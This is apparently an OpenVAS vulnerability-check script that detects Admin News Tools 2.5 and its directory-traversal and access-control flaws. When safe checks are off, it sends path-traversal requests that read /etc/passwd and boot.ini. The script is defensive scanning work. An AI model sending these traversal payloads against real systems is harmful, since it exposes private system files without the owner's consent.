###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_admin_news_tools_mult_vuln_jul09.nasl 15 2013-10-27 12:49:54Z jan $
#
# Admin News Tools Multiple Vulnerabilities
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to bypass security
  restrictions by gaining sensitive information and redirect the user to
  other malicious sites.
  Impact Level: Application";
tag_affected = "Admin News Tools version 2.5";
tag_insight = "- Input passed via the 'fichier' parameter in 'system/download.php' is not
    properly verified before being processed and can be used to read arbitrary
    files via a .. (dot dot) sequence.
  - Access to system/message.php is not restricted properly and can be
    exploited to post news messages by accessing the script directly.";
tag_solution = "Upgrade to Admin News Tools version 3.0 or later
  For updates refer to http://www.adminnewstools.fr.nf/";
tag_summary = "This host is installed with Admin News Tools and is prone to
  multiple vulnerabilities.";

if(description)
{
  script_id(900905);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-07-31 07:37:13 +0200 (Fri, 31 Jul 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-2557", "CVE-2009-2558");
  script_name("Admin News Tools Multiple Vulnerabilities");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35842");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9161");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9153");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/51780");

  script_description(desc);
  script_summary("Check for the version of Admin News Tools");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_admin_news_tools_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

antPort = get_http_port(default:80);
if(!antPort){
  exit(0);
}

antVer = get_kb_item("www/" + antPort + "/Admin-New-Tools");
antVer = eregmatch(pattern:"^(.+) under (/.*)$", string:antVer);
if(antVer[2] != NULL)
{
  if(!safe_checks())
  {
    # Attack string for Windows
    sndReq = http_get(item:string(antVer[2],"/news/system/download.php?fichier" +
                                   "=./../../../../../boot.ini"),port:antPort);
    rcvRes = http_send_recv(port:antPort, data:sndReq);
    if("boot loader" >< rcvRes)
    {
      security_hole(antPort);
      exit(0);
    }

    # Attack string for Linux
    sndReq1 = http_get(item:string(antVer[2],"/news/system/download.php?fichier" +
                                   "=../../../../../../etc/passwd"),port:antPort);
    rcvRes1 = http_send_recv(port:antPort, data:sndReq1);
    if("root" >< rcvRes1)
    {
      security_hole(antPort);
      exit(0);
    }
  }
}

if(antVer[1] == NULL){
  exit(0);
}

# Check if the version of Admin News Tools is 2.5
if(version_is_equal(version:antVer[1], test_version:"2.5")){
  security_hole(antPort);
}
